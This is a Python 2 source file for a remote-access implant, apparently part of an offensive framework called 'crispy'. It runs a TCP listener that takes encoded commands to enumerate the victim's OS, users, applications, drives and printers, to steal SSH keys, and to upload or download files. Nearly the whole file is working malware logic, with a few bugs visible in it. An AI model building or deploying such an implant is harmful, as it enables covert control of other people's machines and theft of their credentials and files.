import os
import platform
import SocketServer
import sys
import os

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)),'..'))

from crispy.os_types.macintosh import Mac
from crispy.os_types.windows import Windows
from crispy.encoders.mime import Mime

class ImplantHandler(SocketServer.BaseRequestHandler):
    
    def handle(self):
        if platform.system() == 'Darwin':
            victim = Mac()
        elif platform.system() == 'Windows':
            victim = Windows()
        else:
            self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")

        while True:
            try:
                cmd = cipher.decode(self.request.recv(1024)).strip()
                
                if cmd == "enum_os":
                    self.request.sendall(cipher.encode(victim.enum_os()))
                elif cmd == "enum_users":
                    self.request.sendall(cipher.encode(victim.enum_users()))
                elif cmd == "enum_applications":
                    self.request.sendall(cipher.encode(victim.enum_applications()))
                elif cmd == "enum_drives":
                    self.request.sendall(cipher.encode(victim.enum_drives()))
                elif cmd == "enum_printers":
                    self.request.sendall(cipher.encode(victim.enum_printers()))
                elif cmd == "get_ssh_keys":
                    self.request.sendall(cipher.encode(victim.get_ssh_keys()))
                elif cmd.startswith('upload') == True:
                    saveMeFile = cmd[7:].split(' ')[1]
                    
                    if os.path.isfile(saveMeFile):
                        break 
                    else:   
                        try:
                            f = open(saveMeFile, 'wb')
                            while True:
                                data = cipher.decode(self.request.recv(1024))
                                 
                                if not data:
                                    break
                                elif data == "EOF!EOF!": 
                                    f.write(data[:-8])
                                    break
                                else:
                                    f.write(data)
                            f.close()
                        except: 
                            pass     
                elif cmd.startswith('download') == True:
                    sendMeFile = cmd[9:].split(' ')[0]
                    
                    f = open(sendMeFile, 'rb')
                    while True:
                        data = f.read(1024)

                        if not data:
                            break
                        else:
                            self.request.sendall(cipher.encode(data)) 
                    f.close()
                    self.request.sendall("EOF!EOF!") 
                else:
                    self.request.sendall(cipher.encode("unknown command\n"))
            except: 
                server.close_request(self.request)
                sys.exit(1)                            
        
if __name__ == "__main__":
    HOST, PORT = "localhost", 8080
    cipher = Mime()

    try:
        server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
        print "[+] Implant active...Terminate w/ Ctrl-C\n"
        server.serve_forever()
    except:
        print "[!] Couldn't start server"
